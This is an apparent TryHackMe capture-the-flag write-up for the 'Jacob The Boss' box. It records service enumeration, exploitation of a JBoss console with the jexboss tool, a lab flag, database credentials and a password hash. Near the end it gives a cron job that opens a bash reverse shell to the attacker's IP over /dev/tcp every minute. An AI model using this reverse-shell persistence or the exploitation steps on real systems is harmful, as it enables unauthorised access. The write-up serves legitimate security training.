# Tryhackme.com Room : Jacob The Boss
`https://tryhackme.com/room/jacobtheboss`


# Instance
```
export IP=10.10.188.233
Hostname = jacobtheboss.box
```

# Nmap
```
22/tcp   open  ssh         OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:ca:13:6e:d9:63:c0:5f:4a:23:a5:a5:a5:10:3c:7f (RSA)
|   256 a4:6e:d2:5d:0d:36:2e:73:2f:1d:52:9c:e5:8a:7b:04 (ECDSA)                                                                            
|_  256 6f:54:a6:5e:ba:5b:ad:cc:87:ee:d3:a8:d5:e0:aa:2a (ED25519)                                                                          
80/tcp   open  http        Apache httpd 2.4.6 ((CentOS) PHP/7.3.20)                                                                        
|_http-server-header: Apache/2.4.6 (CentOS) PHP/7.3.20                                                                                     
|_http-title: My first blog                                                                                                                
111/tcp  open  rpcbind     2-4 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|_  100000  3,4          111/udp6  rpcbind
1090/tcp open  java-rmi    Java RMI
|_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
1098/tcp open  java-rmi    Java RMI
1099/tcp open  java-object Java Object Serialization
| fingerprint-strings:
|   NULL:
|     java.rmi.MarshalledObject|
|     hash[
|     locBytest
|     objBytesq
|     http://jacobtheboss.box:8083/q
|     org.jnp.server.NamingServer_Stub
|     java.rmi.server.RemoteStub
|     java.rmi.server.RemoteObject
|     xpw;
|     UnicastRef2
|_    jacobtheboss.box
3306/tcp open  mysql       MariaDB (unauthorized)
4444/tcp open  java-rmi    Java RMI
4445/tcp open  java-object Java Object Serialization
4446/tcp open  java-object Java Object Serialization
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods:
|   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
|   Potentially risky methods: PUT DELETE TRACE
|_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
| http-methods:
|_  Potentially risky methods: PUT DELETE TRACE
|_http-open-proxy: Proxy might be redirecting requests
|_http-server-header: Apache-Coyote/1.1
|_http-title: Welcome to JBoss&trade;
8083/tcp open  http        JBoss service httpd
|_http-title: Site doesn't have a title (text/html).
3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1099-TCP:V=7.80%I=7%D=10/4%Time=5F7A571D%P=x86_64-pc-linux-gnu%r(NU
SF:LL,16F,"\xac\xed\0\x05sr\0\x19java\.rmi\.MarshalledObject\|\xbd\x1e\x97
SF:\xedc\xfc>\x02\0\x03I\0\x04hash\[\0\x08locBytest\0\x02\[B\[\0\x08objByt
SF:esq\0~\0\x01xp\xfa\x83\xc8Iur\0\x02\[B\xac\xf3\x17\xf8\x06\x08T\xe0\x02
SF:\0\0xp\0\0\0\.\xac\xed\0\x05t\0\x1dhttp://jacobtheboss\.box:8083/q\0~\0
SF:\0q\0~\0\0uq\0~\0\x03\0\0\0\xc7\xac\xed\0\x05sr\0\x20org\.jnp\.server\.
SF:NamingServer_Stub\0\0\0\0\0\0\0\x02\x02\0\0xr\0\x1ajava\.rmi\.server\.R
SF:emoteStub\xe9\xfe\xdc\xc9\x8b\xe1e\x1a\x02\0\0xr\0\x1cjava\.rmi\.server
SF:\.RemoteObject\xd3a\xb4\x91\x0ca3\x1e\x03\0\0xpw;\0\x0bUnicastRef2\0\0\
SF:x10jacobtheboss\.box\0\0\x04J\0\0\0\0\0\0\0\0\x9b3\x1e6\0\0\x01t\xf5\xd
SF:f\x82\xf3\x80\0\0x");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4445-TCP:V=7.80%I=7%D=10/4%Time=5F7A5723%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4,"\xac\xed\0\x05");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4446-TCP:V=7.80%I=7%D=10/4%Time=5F7A5723%P=x86_64-pc-linux-gnu%r(NU
SF:LL,4,"\xac\xed\0\x05");
MAC Address: 02:32:82:9C:6E:AB (Unknown)
```


# Exploration

We got a `Dotclear` blog running on port 80
	* Seems to be only 1 entry on the blog
	* Not sure what version
		** When visiting `/admin` all js file have `?v=2.16.9`, Seems like this is the dotclear version
			*** Doesn't seems like there is known exploit for this version

We have another webserver running on port `8080`

This is running the `JBoss` application which is probably the target

`jacobtheboss.box:8080/status` : We get access to tomcat status which show a bunch of infos on the machine and statistics on requests

We get more infos at `http://jacobtheboss.box:8080/status?full=true`
Seems like there is a bunch of services running

```
/
/status
*.jsp, *.jspx
/AcknowledgeActiveAlarms
/Invoker/*
/ManageStringThresholdMonitor
/CreateThresholdMonitor 
/ManageSnapshot
/CreateSnapshot
/pclink
/services/*
/HtmlAdaptor
/DisplayMBeans
/cluster/ClusteredConsole
/DisplayOpResult
/InspectMBean
and more...
```

We got the `JMX Console` at `http://jacobtheboss.box:8080/jmx-console/`
Seems like we can modify a bunch of settings from there
But when I apply any changes I get a `500` Error
This give us the version of jboss tho 
```
JBoss Web/2.1.1.GA
```

We got some `web-console` at `http://jacobtheboss.box:8080/web-console/`
Seems like just a bunch of read only infos. There is a menu on the left that is hidden tho, maybe if we visit this page with more permissions we can do some stuff ?

Hmmm, the `500 internal error` page reported version `2.1.1` but the web-console report 
```
Version: 5.0.0.GA (build: SVNTag=JBoss_5_0_0_GA date=200812041721)
```
Also, other interesting infos :
```
Base Location (local): /srv/jboss/server
```

Seems like there is some exploits available, let's check the other services and we come back to this after.

We get an empty response at `http://jacobtheboss.box:8083/`.
	Actually, we get an empty response for every url.

nmap says there is another http server at `8009` but I just get connection reset.

The other ports are some java serialization stuff, prob related to jboss
There is also a mysql db running on port `3306`. Need credentials tho

Reading on `jboss` seems like it's a platform similar to `tomcat` (Well it include a tomcat instance) that aim to deploy java applications.

We have another interface at `http://jacobtheboss.box:8080/jbossws/`

We can list deployed services at `http://jacobtheboss.box:8080/jbossws/services`

There is no deployed services right now, maybe we need to deploy our own service ?

On thing is clear `/jmx-console` is the admin console for jboss

In `jmx-console`, filter `jboss` object `service=WebService` Seems like we can change the bind address of the 8083 service. Maybe we can make it point to us and authenticate ourselves somehow ?

Oh well, after some time poking around in the `jmx-console` I tried this `https://github.com/joaomatosf/jexboss` and it just worked flawlessly...

Now got a shell on the box
```
uid=1001(jacob) gid=1001(jacob) groups=1001(jacob) context=system_u:system_r:initrc_t:s0
```

Seems like only the users `jacob` and `root` can spawn shells

We find the user flag in `/home/jacob/user.txt` :
```
f4d491f280de360cc49e26ca1587cbcc
```

We can't run `sudo -l` since we don't know the password

We got access to all the java stuff/jboss in `/srv`. We can now modify everything that we couldn't by directly modifying the xmls.

Looking at what is running on the server using `ps -aux` we see that the server is being runned from root as user jacob
```
sudo -u jacob sh /srv/jboss/bin/run.sh -b jacobtheboss.box
```

What happen if this process crash ? Is it reloaded by root ?

Root is also running
```
/bin/bash /root/jboss.sh
```

Which might be the thing that keep everything running.

If this is true, we might be able to change the `/srv/jboss/bin/run.sh` script.
But since it is runned with `sudo -u jacob`, not sure we can do much...

We have control over the `/srv/java/bin` folder, maybe we can replace the `java` executable ?

Let's run linpeas.

We got mysql local access
```
[+] MySQL connection using root/NOPASS ................. Yes
User    Host    authentication_string
root    localhost
root    boss
root    127.0.0.1
root    ::1
        localhost
        boss
```

We have the following databases :
```
+--------------------+
| Database           |
+--------------------+
| information_schema |
| dotclear           |
| mysql              |
| performance_schema |
| test               |
+--------------------+
```

In `dotclear` database we have the following tables :
```
+--------------------+
| Tables_in_dotclear |
+--------------------+
| dc_blog            |
| dc_category        |
| dc_comment         |
| dc_link            |
| dc_log             |
| dc_media           |
| dc_meta            |
| dc_permissions     |
| dc_ping            |
| dc_post            |
| dc_post_media      |
| dc_pref            |
| dc_session         |
| dc_setting         |
| dc_spamrule        |
| dc_user            |
| dc_version         |
+--------------------+
```

In `dc_user` we find a user with
```
user_id = jacob
user_pwd = $2y$10$tICrvcvuwEQTwGhiT9F.6elbty1McHou9pFTFZTQL3oMqbPihr5YG
user_name = the_boss
user_email = jacob@theboss.box
```

Not sure how to crack this password ? Maybe we can retrieve the salt from the db and lookup the hashing method from the code.

Or maybe we can exploit the email address by modifying the host files for `theboss.box` to point to the local machine. Then maybe we can receive the email from the `jacob` session ?
Hmmm... seems like we can't modify the /etc/hosts file

Interesting settings in `dc_setting` table:
```
Allow PHP code in templates
```

The server is actually runned by `jacob` user
```
/srv/java/bin/java -Dprogram.name=run.sh -server -Xms128m -Xmx512m -XX:MaxPermSize=256m -Dorg.jboss.resolver.warning=true -Dsun.rmi.dgc.client.gcInterval=3600000 -Dsun.rmi.dgc.server.gcInterval=3600000 -Djava.net.preferIPv4Stack=true -Djava.endorsed.dirs=/srv/jboss/lib/endorsed -classpath /srv/jboss/bin/run.jar:/srv/java/lib/tools.jar org.jboss.Main -b jacobtheboss.box
```

From the log, we see the following deployed stuff
```
01:08:40,753 INFO  [TomcatDeployment] deploy, ctxPath=/, vfsUrl=ROOT.war
01:08:40,821 INFO  [TomcatDeployment] deploy, ctxPath=/jexinv4, vfsUrl=management/jexinv4.war
01:08:40,855 WARN  [config] Unable to process deployment descriptor for context '/jexinv4'
01:08:42,260 INFO  [TomcatDeployment] deploy, ctxPath=/jexws4, vfsUrl=management/jexws4.war
01:08:42,297 WARN  [config] Unable to process deployment descriptor for context '/jexws4'
01:08:42,457 INFO  [TomcatDeployment] deploy, ctxPath=/jmx-console, vfsUrl=jmx-console.war
```

Maybe the `ROOT.war` file is launched as root ? Can we modify it ?

Hmmm, by killing the the `jacob` jboss serrver, seems like I killed the `/bin/bash /root/jboss.sh` running as root...

Ok sooo, seems like this is a deadend, `ROOT.war` is actually the homepage.. so nothing there..
I was able to create new `.war` folders and deploy new stuff, doesn't really help tho since it's all runned by `jacob` user.

Hmm, we got to find `jacob` password and wish that we have some sudo rights.
Otherwise, we can try to exploit `dotclear` and gain access as `apache` user.
`jacob` doesn't have write access to `/var/www/html`

Maybe there was some sort of connection running from root with jboss that closed up when I killed the jboss process launched by `jacob`.

Might need to restart the box to try to further exploit this.

Let's go back to `dotclear`.

Looking at the config file in `/var/www/html/dotclear/inc/config.php` we find
```
// Crypt key (password storage)
define('DC_MASTER_KEY','2d91d4e6c0fa15d865bb029f6c8b46ef');

// Cryptographic algorithm
define('DC_CRYPT_ALGO', 'sha512');
```

Reading on dotclear, I found how to generate new hashes (https://www.octopuce.fr/modifier-le-mot-de-passe-dun-compte-dotclear-temporairement/).

We can use this php script
```php
<?php

include("/var/www/html/dotclear/inc/libs/clearbricks/common/lib.crypt.php");
include("/var/www/html/dotclear/inc/config.php");
echo crypt::hmac('2d91d4e6c0fa15d865bb029f6c8b46ef','yolo')."\n";

?>

// Which output fe50a54cd07e7ae19c1bde7b57d2a2935892b64b
```

We can then change the password in the db and login as admin.

But that doesn't give us jacob password...

It might give us access to installing new themes tho, and we saw an option to enable php in themes in the database.
This might give us access to the `apache` user, but what then ? Maybe linpeas runned as `apache` will give us some more stuff ?

Hmmm, the generated hash doesn't seem to work... Not in the same format as the one that was there before. Look like there is some salt with the hash ?

Hmmmm...

As a side note, I couln't launch new shell to the machine using the same exploit. For some reason it didn't work when I already had a connection openned (Didn't try closing the reverse shell and retrying, maybe it's a one time thing.. didn't want to restart the whole machine).
Tried to add an authorized ssh key butit wsn't allowed.
Coulnd't add a php reverse shell inside the /var/www/html
So i opted for a cron job that try to connect to me every minute
```
* * * * * /bin/bash -i >& /dev/tcp/10.10.48.213/4444 0>&1
```

Using `nc -lvp 4444` (no `-n`) we can reuse the same port for multiple shells.